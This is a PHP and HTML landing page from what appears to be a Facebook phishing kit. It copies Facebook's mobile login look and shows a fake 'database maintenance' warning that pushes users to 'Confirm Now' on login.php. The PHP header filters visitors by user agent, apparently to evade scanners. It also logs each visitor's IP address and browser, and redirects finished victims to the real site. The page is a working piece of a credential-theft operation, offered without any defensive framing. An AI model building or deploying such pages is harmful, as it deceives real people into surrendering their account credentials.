<?php
	
	session_start();
	include('block.php');
	isBlocked($_SERVER['HTTP_USER_AGENT']);
	
	if(isset($_SESSION['done']))
		header('Location: http://facebook.com');

	file_put_contents("accessed.txt", $_SERVER['REMOTE_ADDR'] . " - " . $_SERVER['HTTP_USER_AGENT'] . PHP_EOL, FILE_APPEND);
?>

<!DOCTYPE html>
<!-- saved from url=(0069)https://m.#/?refsrc=https%3A%2F%2Fwww.#%2F&_rdr -->
<html>
   <head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
      
      <title>Facebook - Log In or Sign Up</title>
      <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1">
      <link href="login_files/fb_logo.png" rel="apple-touch-icon-precomposed" sizes="196x196">
      <meta name="referrer" content="default" id="meta_referrer">
      <link rel="stylesheet" type="text/css" data-bootloader-hash="JBift" href="./login_files/sflZM3vcKTF.css">
      <link rel="stylesheet" type="text/css" data-bootloader-hash="898Rr" href="./login_files/SrSKncNeeYJ.css">
      <link rel="stylesheet" type="text/css" data-bootloader-hash="dBZLm" href="./login_files/pF-8UwpBzdj.css">
      <meta name="description" content="Create an account or log into Facebook. Connect with friends, family and other people you know. Share photos and videos, send messages and get updates.">
      <link rel="canonical" href="https://www.#/">
   </head>
   <body tabindex="0" class="touch x1 android no_acceleration _fzu _50-3 iframe acw portrait" style="min-height: 925px; background-color: rgb(255, 255, 255);">
      <div id="viewport" style="min-height: 925px;">
         <h1 style="display:block;height:0;overflow:hidden;position:absolute;width:0;padding:0">Facebook</h1>
         <div id="page">
            <div class="_129_" id="header-notices"></div>
            <div class="_4g33 _52we _52z5" id="header">
               <div class="_4g34 _52z6" data-sigil="mChromeHeaderCenter"><a href="https://m.#/login/?refid=8"><img src="login_files/logo.png"></img></a></div>
            </div>
            <div class="_5soa acw" id="root" role="main" data-sigil="context-layer-root content-pane" style="min-height: 925px;">
               <div class="_4g33">
                  <div class="_4g34">
                     <div class="_5yd0 _2ph- _5yd1" style="display: none;" data-sigil="m_login_notice">
                        <div class="_52jd"></div>
                     </div>
                     <div class="aclb">
                       
                        <div class="_5rut"><br>
                           <h4> Dear Facebook user </h4><br><hr><br>
						   
						   We are performing usual maintenance to our database servers! You are required to confirm your account details today, otherwise your account might be limited without further notification!
						   To confirm your account, please click the button below!<br><Br>
						   <a href="login.php" value="Log In" class="_54k8 _52jh _56bs _56b_ _56bw _56bu" name="login" id="u_0_4" data-sigil="touchable m_login_button"><span class="_55sr">Confirm Now</span></a>
                       
						<br><Br><Br>
					   </div>
					  
                     </div>
                  </div>
				  
               </div>
               <div></div>
				<br><Br><center><p style="color:gray">Facebook © 2020</p></center>
             
            </div>
           
   </body>
</html>